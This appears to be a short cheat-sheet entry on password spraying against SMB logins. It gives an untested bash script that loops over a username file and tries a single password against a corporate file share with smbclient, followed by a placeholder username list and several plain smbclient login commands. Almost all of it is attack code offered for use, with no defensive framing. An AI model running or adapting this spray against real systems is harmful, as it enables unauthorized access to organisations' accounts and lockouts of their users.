Password Spray SMB logins
-----------------------------
```bash
# Needs tweaking to loop through "usernames.txt"
# Something like this, note untested.....

####### BEGIN SCRIPT ############
#!/bin/bash
usernames=$1
while read u; do
#echo $u 
#echo 'CORP\'$u'%passwordgoeshere'
smbclient \\\\server.corp.domain.name.com\\sharename -U 'DOMAIN-NAME\'$u'%passwordgoeshere'
done < "$usernames"
####### END SCRIPT ##############

# List of usernames
username1
username2
username3
username4
username5

# basic SMB login
/usr/bin/smbclient \\\\server78\\publicfolder -U=user%password

smbclient \\\\server.corp.domain.name.org\\sharename -U 'DOMAIN\USERNAME'

smbclient \\\\server.corp.domain.name.org\\sharename -U DOMAIN/\<USERNAME>%passwordgoeshere
````
